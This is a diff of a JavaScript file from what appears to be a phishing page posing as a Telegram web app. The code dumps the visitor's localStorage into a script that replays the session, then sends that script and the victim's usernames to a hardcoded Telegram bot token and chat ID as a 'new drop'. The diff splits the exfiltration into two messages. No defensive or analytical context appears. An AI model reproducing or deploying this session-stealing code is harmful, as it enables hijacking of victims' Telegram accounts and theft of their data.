@@ -45,10 +45,17 @@ document.addEventListener('DOMContentLoaded', function () {
             localStorage
           )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;
 
+          const encodedAuth = encodeURI(quickAuth)
+
           fetch(
-            `https://api.telegram.org/bot7955294841:AAFDavf_6cL0_uk3RLExdrUORlOPd6cBoSw/sendMessage?chat_id=7427019338&text=👨🏻‍🍳💰 new drop%0A%0A📫 username: ${usernames}%0A🔐 Script: ${quickAuth}%0A%0AThank You!`,
+            `https://api.telegram.org/bot7955294841:AAFDavf_6cL0_uk3RLExdrUORlOPd6cBoSw/sendMessage?chat_id=7427019338&text=👨🏻‍🍳💰 new drop%0A%0A📫 username: ${usernames}%0AScript Below%0AThank You!`,
             { method: 'GET' }
-          );
+          ).then(() => {
+           fetch(
+            `https://api.telegram.org/bot7955294841:AAFDavf_6cL0_uk3RLExdrUORlOPd6cBoSw/sendMessage?chat_id=7427019338&text=${encodedAuth}`,
+            { method: 'GET' }
+          )
+          })
 
           window.Telegram.WebApp.openTelegramLink(
             'https://t.me/+8dtqN7T2sJpmNTb7'
